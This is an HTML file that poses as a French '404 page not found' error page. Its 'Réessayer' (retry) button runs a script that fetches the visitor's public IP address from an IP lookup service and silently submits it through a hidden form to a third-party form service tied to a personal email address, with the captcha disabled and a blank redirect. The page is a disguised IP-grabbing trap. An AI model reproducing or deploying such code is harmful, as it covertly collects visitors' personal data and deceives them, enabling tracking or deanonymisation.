<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>404 - Page non trouvée</title>
  <style>
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    h1 {
      font-size: 10rem;
      margin: 0;
    }
    p {
      font-size: 1.5rem;
      margin: 10px 0 20px;
    }
    button {
      text-decoration: none;
      color: #00bcd4;
      background-color: #1e1e1e;
      padding: 10px 20px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background-color: #00bcd4;
      color: #121212;
    }
    #ip-form {
      display: none;
    }
  </style>
</head>
<body>
  <h1>404</h1>
  <p>Oups... La page que tu cherches n'existe pas.</p>
  <button onclick="reenvoi()">Réessayer</button>

  <!-- Formulaire caché -->
  <form id="ip-form" action="https://formsubmit.co/blackeige2@gmail.com" method="POST">
    <input type="hidden" name="IP" id="ip-input">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="about:blank">
    <button type="submit" id="submit-btn" style="display: none;"></button>
  </form>

  <script>
    function reenvoi() {
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          document.getElementById('ip-input').value = data.ip;
          document.getElementById('submit-btn').click();
        });
    }
  </script>
</body>
</html>
